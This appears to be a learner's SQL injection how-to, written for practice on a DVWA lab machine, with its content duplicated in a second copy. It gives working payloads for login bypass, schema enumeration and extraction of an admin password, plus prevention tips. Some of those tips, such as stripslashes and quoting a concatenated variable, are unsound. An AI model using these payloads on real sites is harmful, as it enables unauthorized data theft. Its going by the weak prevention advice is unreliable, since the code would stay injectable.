SQL injection
#BASICS

SQL injection is used to directly inject code into the database using forms

Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input. 
To avoid SQL injection flaws, developers need to:

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  
  -Stop writing dynamic queries with string concatenation or
  -Prevent malicious SQL input from being included in executed queries.

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  

-> The little trick
If you just add a "'" at the end of an email field (example "adminÂ¹vulneweb.com'") and see a "Query Error" message, that means that there is 
potentially a possibility to use SQL injection on that wensite.
Example of message "Query Error: Errror: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual ..."

-> Another way to obtain a comment
If during your quest, the "#" char does not seem to work (comments the end of the request), you should try "--" instead.
In this page, consider that "#" is used for "#" or "--"

-> Some examples of injection into forms
Use DVWA (Security Low) on the Metasploitable machine.

No need of password.
  Add (between []) [' OR 1=1 #] to obtain instant access to Admin page.

Obtain the number of columns.
  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until a bad request (error). The max try  gives the number of columns.

Obtain the database version.
  Add [pwd' union select 1,version(),3,4,5 #]
      or
  Add [' OR 1=1 union select 1,@@version order by 1 #]
      or
  Add [' OR 1=1 union select 1,sqlite_version() order by 1 #]
      or
  Add [' union select 1,@@version order by 1 #]
    For a table with only 2 columns. /!\ the second SELECT must have the same number of column than the first one.

Obtain name of database.
  Add [pwd' union select 1,database() #]

Obtain names of all tables.
  Add [pwd' union select table_name,null from information_schema.tables #]    !!! Here, the null replace the second parameter.
    In the example above, you have only two columns.
      or
  Add [' OR 1=1 union select 0, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() order by 1 #]
      or
  Add [' OR 1=1 union select type,name from sqlite_master #]
    The SQLite database holds the database schema in the table sqlite_master.

Obtain names of columns.
  Add [pwd' union select 1,2,3,4,5 #]
  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]
    or
  Add [' OR 1=1 union select type,name,tbl_name,rootpage,sql from sqlite_master #]
    The sql column contains the SQL command used to create the tables. So interesting !!

Obtain the username of the Database.
  Add [pwd' union select 1,user(),3,4,5 #]

Obtain the admin's password.
  Add [' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id #]

-> How to prevent yourself from SQL injection
  -Use real_escape_string() function in PHP code.
     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
  -Use stripslashes() function in PHP code.
  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
  -Stop writing dynamic queries with string concatenation.
  -Prevent malicious SQL input from being included in executed queries.
  -Do not display SQL error to the client/user. Be blind !!

-> Direct injection in the GET request        |
-> Blind injection                            | -> See: howto-0061-sql-injection-advanced.txt
-> Use escapment characters                   |
-> Use another encoding into URL              |

-> Read files from URL injection              | -> See howto-0068-sql-injection-read-files.txt

>@################################################################################################################################################
>@#                                                                                                                                              #
>@# [ SQL injection | Simple ]                                                                                                                   #
>@#                                                                                                                                              #
>@# SQL injection is used to directly inject code and SQL requests into the database using forms or URL.                                         #
>@#                                                                                                                                              #
>@# Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input.  #
>@# To avoid SQL injection flaws, developers need to:                                                                                            #
>@#                                                                                                                                              #
>@#   -Stop writing dynamic queries with string concatenation.                                                                                   #
>@#   -Prevent malicious SQL input from being included in executed queries.                                                                      #
>@#                                                                                                                                              #
>@# See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html                                                #
>@# See: howto-0061-sql-injection-advanced.txt                                                                                                   #
>@# See: howto-0068-sql-injection-read-files.txt                                                                                                 #
>@# See: howto-0100-prevention-web-vulnerability.txt                                                                                             #
>@# See: howto-1075-owasp-top-10.txt                                                                                                             #
>@# See: howto-1076-owasp-top-10-fr.txt                                                                                                          #
>@#                                                                                                                                              #
>@#----------------------------------------------------------------------------------------------------------------------------------------------- 
>@
>@-> The little trick
>@If you just add a "'" at  the end of an email field (example "admin&vulneweb.com'") and see a "Query Error" message, that means that there is 
>@potentially a possibility to use SQL injection on that wensite.
>@Example of message "Query Error: Errror: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual ..."
>@
>@-> Another way to obtain a comment
>@If during your quest, the "#" char does not seem to work (comments the end of the request), you should try "--" instead.
>@In this page, consider that "#" is used for "#" or "--"
>@
>@-> Some examples of injection into forms. 
>@Use DVWA (Security Low) pn the Metasploitable machine.
>@
>@No need of password.
>@  Add (between []) [' OR 1=1 #] to obtain instant access to Admin page.
>@
>@Obtain the number of columns.
>@  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until a bad request (error). The max try  gives the number of columns.
>@
>@Obtain the database version.
>@  Add [pwd' union select 1,version(),3,4,5 #]
>@      or
>@  Add [' OR 1=1 union select 1,@@version order by 1 #]
>@      or
>@  Add [' OR 1=1 union select 1,sqlite_version() order by 1 #]
>@      or
>@  Add [' union select 1,@@version order by 1 #]
>@    For a table with only 2 columns. /!\ the second SELECT must have the same number of column than the first one.
>@
>@Obtain name of database.
>@  Add [pwd' union select 1,database() #]
>@
>@Obtain names of all tables.
>@  Add [pwd' union select table_name,null from information_schema.tables #]    !!! Here, the null replace the second parameter.
>@    In the example above, you have only two columns.
>@      or
>@  Add [' OR 1=1 union select 0, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() order by 1 #]
>@      or
>@  Add [' OR 1=1 union select type,name from sqlite_master #]
>@    The SQLite database holds the database schema in the table sqlite_master.
>@
>@Obtain names of columns.
>@  Add [pwd' union select 1,2,3,4,5 #]
>@  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]
>@    or
>@  Add [' OR 1=1 union select type,name,tbl_name,rootpage,sql from sqlite_master #]
>@    The sql column contains the SQL command used to create the tables. So interesting !!
>@
>@Obtain the username of the Database.
>@  Add [pwd' union select 1,user(),3,4,5 #]
>@
>@Obtain the admin's password.
>@
>@-> How to prevent yourself from SQL injection
>@  -Use real_escape_string() function in PHP code.
>@     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
>@  -Use stripslashes() function in PHP code.
>@  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
>@  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
>@  -Stop writing dynamic queries with string concatenation.
>@  -Prevent malicious SQL input from being included in executed queries.
>@  -Do not display SQL error to the client/user. Be blind !!
>@
>@-> Direct injection in the GET request        |
>@-> Blind injection                            | -> See: howto-0061-sql-injection-advanced.txt
>@-> Use escapment characters                   |
>@-> Use another encoding into URL              |
>@
>@-> Read files from URL injection              | -> See howto-0068-sql-injection-read-files.txt
>@
>@################################################################################################################################################
>@
